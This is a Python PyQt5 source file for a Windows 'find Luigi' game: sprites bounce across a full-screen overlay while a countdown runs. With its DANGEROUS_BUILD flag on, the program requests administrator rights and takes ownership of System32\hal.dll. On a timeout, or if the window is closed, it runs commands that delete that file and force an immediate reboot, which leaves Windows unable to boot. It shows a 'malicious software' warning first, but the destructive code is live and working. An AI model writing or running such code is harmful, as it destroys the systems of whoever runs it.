from PyQt5.QtCore import QPointF, Qt, QTimer, QUrl
from PyQt5.QtGui import QFont, QPixmap
from PyQt5.QtMultimedia import QMediaContent, QMediaPlayer, QMediaPlaylist
from PyQt5.QtWidgets import (
    QApplication,
    QGraphicsPixmapItem,
    QGraphicsScene,
    QGraphicsTextItem,
    QGraphicsView,
    QWidget,
)
import sys, os, ctypes, random

# Constants
FRAME_RATE = 60
SPEED_FACTOR = 2
IMAGE_SCALE_FACTOR = 4
DANGEROUS_BUILD = True
PIXELS_PER_SPRITE = 35000  # 1 sprite per n pixels
IDOK = 1
IDCANCEL = 2


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def run_as_admin():
    params = ' '.join(f'"{arg}"' for arg in sys.argv[1:])
    try:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, f'"{sys.argv[0]}" {params}', None, 1
        )
    except Exception as e:
        print(f"Failed to elevate privileges: {e}")
        return False
    return True


# Return an absolute path that works for both PyInstaller bundles and source.
def resource_path(rel_path):
    base_path = getattr(sys, "_MEIPASS", os.path.dirname(__file__))
    return os.path.join(base_path, rel_path)


def good_ending():
    overlay._closing_good = True
    overlay.player.stop()
    overlay.close()
    sys.exit(0)


def bad_ending():
    if DANGEROUS_BUILD:
        os.system("del /f /q C:\\Windows\\System32\\hal.dll")
        os.system("shutdown /r /t 0")
    overlay.player.stop()
    overlay.close()
    sys.exit(1)


# A QGraphicsPixmapItem that emits a callback on left-click.
class ClickablePixmapItem(QGraphicsPixmapItem):
    def __init__(self, pixmap, callback=None, *args, **kwargs):
        super().__init__(pixmap, *args, **kwargs)
        self.callback = callback
        self.setAcceptHoverEvents(True)
        self.setAcceptedMouseButtons(Qt.LeftButton)

    def mousePressEvent(self, event):
        if self.callback:
            self.callback(self)
        super().mousePressEvent(event)


# Transparent, always-on-top window that hosts the sprite scene.
class Overlay(QWidget):
    def __init__(self, images):
        # Frameless, top-most window that does not steal focus
        flags = Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool
        super().__init__(None, flags)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setAttribute(Qt.WA_TransparentForMouseEvents)

        self.images = images
        self.sprites = []
        self._inited = False
        self.speed_factor = SPEED_FACTOR
        self._closing_good = False  # Track if close is a good ending

        # Background audio
        wav_file = resource_path(os.path.join("assets", "audio", "wanted.wav"))
        playlist = QMediaPlaylist()
        playlist.addMedia(QMediaContent(QUrl.fromLocalFile(wav_file)))
        playlist.setPlaybackMode(QMediaPlaylist.Loop)

        self.player = QMediaPlayer(self)
        self.player.setPlaylist(playlist)
        self.player.setVolume(50)
        self.player.play()

        # Must be fullscreen before showEvent
        self.showFullScreen()

    # Qt events and setup helpers
    def showEvent(self, event):
        super().showEvent(event)
        if not self._inited:
            self._setup_scene()
            self._inited = True

    def closeEvent(self, event):
        if getattr(self, "_closing_good", False):
            event.accept()
        else:
            bad_ending()

    # Create graphics scene, add sprites, and start timers.
    def _setup_scene(self):
        width, height = self.width(), self.height()

        # Scene and view covering the whole screen
        self.scene = QGraphicsScene(0, 0, width, height)
        self.view = QGraphicsView(self.scene, self)
        self.view.setGeometry(0, 0, width, height)
        self.view.setFrameShape(self.view.NoFrame)
        self.view.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.view.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.view.setAttribute(Qt.WA_TranslucentBackground)
        self.view.setStyleSheet("background: transparent; border: none")
        self.view.viewport().setAttribute(Qt.WA_TranslucentBackground)
        self.view.show()

        # Countdown timer
        self.counter = 30
        self.text_item = QGraphicsTextItem(str(self.counter))
        self.text_item.setDefaultTextColor(Qt.red)
        self.text_item.setFont(QFont("Arial", 64, weight=QFont.Bold))
        rect = self.text_item.boundingRect()
        self.text_item.setPos((width - rect.width()) / 2, 10)
        self.text_item.setZValue(1)
        self.scene.addItem(self.text_item)

        self.countdown_timer = QTimer(self)
        self.countdown_timer.timeout.connect(self._update_counter)
        self.countdown_timer.start(1000)

        # Sprite click callback
        def on_sprite_clicked(item):
            for sprite in self.sprites:
                if sprite["item"] is item:
                    file_name = sprite["file_name"]
                    print("Clicked on:", file_name)
                    if file_name.endswith("LuigiIcon.png"):
                        good_ending()
                    else:
                        self.counter = max(0, self.counter - 5)
                    break

        # Add sprites
        for image in self.images:
            path = image["path"]
            count = image.get("n", 1)
            pix = QPixmap(path)
            if pix.isNull():
                continue

            # Scale the pixmap
            pix = pix.scaled(
                pix.width() * IMAGE_SCALE_FACTOR,
                pix.height() * IMAGE_SCALE_FACTOR,
                Qt.KeepAspectRatio,
                Qt.SmoothTransformation,
            )

            max_x = max(0, width - pix.width())
            max_y = max(0, height - pix.height())

            for _ in range(count):
                item = ClickablePixmapItem(pix, callback=on_sprite_clicked)

                # Random initial position and velocity
                x = random.uniform(0, max_x)
                y = random.uniform(0, max_y)
                item.setPos(x, y)
                item.v = QPointF(
                    random.uniform(-3, 3) * self.speed_factor,
                    random.uniform(-3, 3) * self.speed_factor,
                )

                self.scene.addItem(item)
                self.sprites.append({"item": item, "file_name": path})

        # Animation timer
        timer = QTimer(self)
        timer.timeout.connect(self._move_sprites)
        timer.start(1000 // FRAME_RATE)

    # Timer callbacks

    # Move sprites and bounce them off window edges.
    def _move_sprites(self):
        width, height = self.width(), self.height()
        for sprite in self.sprites:
            item = sprite["item"]
            pos = item.pos() + item.v

            if not (0 <= pos.x() <= width - item.pixmap().width()):
                item.v.setX(-item.v.x())
            if not (0 <= pos.y() <= height - item.pixmap().height()):
                item.v.setY(-item.v.y())

            item.setPos(item.pos() + item.v)

    # Decrease countdown every second and check for timeout.
    def _update_counter(self):
        self.counter -= 1
        if self.counter <= 0:
            self.countdown_timer.stop()
            bad_ending()
            return

        self.text_item.setPlainText(str(self.counter))
        rect = self.text_item.boundingRect()
        self.text_item.setPos((self.width() - rect.width()) / 2, 10)


# Main entry point
if __name__ == "__main__":
    app = QApplication(sys.argv)
    screen = app.primaryScreen()
    screen_geometry = screen.geometry()
    width, height = screen_geometry.width(), screen_geometry.height()
    px_count = screen.availableGeometry().width() * screen.availableGeometry().height()
    num_sprites = px_count // PIXELS_PER_SPRITE // 3
    print(num_sprites)

    if DANGEROUS_BUILD:
        def confirm(message, title):
            return ctypes.windll.user32.MessageBoxW(0, message, title, 1) == IDOK

        if not is_admin():
            if not confirm(
                "This program requires administrator privileges to run.",
                "Permission Required"
            ):
                print("Exiting")
                sys.exit(0)
            print("Requesting administrator privileges...")
            run_as_admin()
            sys.exit(0)

        warning_text = (
            "THIS PROGRAM IS MALICIOUS SOFTWARE! Continuing beyond this point will harm "
            "the security of your system and may cause damage to your system.\n\n"
            'Click "Cancel" to exit without damage.\n\n'
        )
        if not confirm(warning_text, "Malicious Software Warning"):
            sys.exit(0)

        if not confirm("Are you sure you want to continue?", "Final Warning"):
            sys.exit(0)

        os.system(r"takeown /f C:\Windows\System32\hal.dll")
        os.system(r"copy C:\Windows\System32\hal.dll %USERPROFILE%\hal.dll.bak")
        os.system(r"icacls C:\Windows\System32\hal.dll /grant administrators:F")

    images_dir = resource_path(os.path.join("assets", "images"))
    images = [
        {"path": os.path.join(images_dir, "MarioIcon.png"), "n": num_sprites},
        {"path": os.path.join(images_dir, "WarioIcon.png"), "n": num_sprites},
        {"path": os.path.join(images_dir, "YoshiIcon.png"), "n": num_sprites},
        {"path": os.path.join(images_dir, "LuigiIcon.png"), "n": 1},
    ]

    overlay = Overlay(images)
    sys.exit(app.exec_())
